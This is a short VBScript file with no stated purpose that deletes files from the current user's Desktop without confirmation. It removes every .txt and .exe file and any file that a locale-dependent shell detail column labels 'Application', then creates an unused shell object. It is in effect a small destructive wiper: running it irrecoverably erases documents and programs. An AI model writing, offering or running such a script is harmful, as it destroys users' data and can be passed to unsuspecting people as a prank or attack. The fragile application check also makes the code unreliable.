Option Explicit

Dim objFSO, objFolder, objFile, objShell, i

' Create a FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get the Desktop folder
Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("Desktop"))

' Loop through each file in the Desktop folder and delete if it has the .txt, .exe, or is an application
For Each objFile In objFolder.Files
    Dim extension
    extension = LCase(objFSO.GetExtensionName(objFile.Name))
    If extension = "txt" Or extension = "exe" Or IsApplication(objFile.Path) Then
        objFSO.DeleteFile(objFile.Path)
    End If
Next

' Function to check if a file is an application
Function IsApplication(filePath)
    Dim objShell
    Set objShell = CreateObject("Shell.Application")
    
    ' Get the folder containing the file
    Dim objFolder
    Set objFolder = objShell.Namespace(objFSO.GetParentFolderName(filePath))
    
    ' Get the file object in the folder
    Dim objItem
    Set objItem = objFolder.ParseName(objFSO.GetFileName(filePath))
    
    ' Check if the file is an application
    Dim appProperty
    appProperty = objFolder.GetDetailsOf(objItem, 34)
    If appProperty = "Application" Then
        IsApplication = True
    Else
        IsApplication = False
    End If
    
    Set objItem = Nothing
    Set objFolder = Nothing
    Set objShell = Nothing
End Function

' Release FileSystemObject resources
Set objFile = Nothing
Set objFolder = Nothing
Set objFSO = Nothing

' Create a Shell object
Set objShell = CreateObject("WScript.Shell")
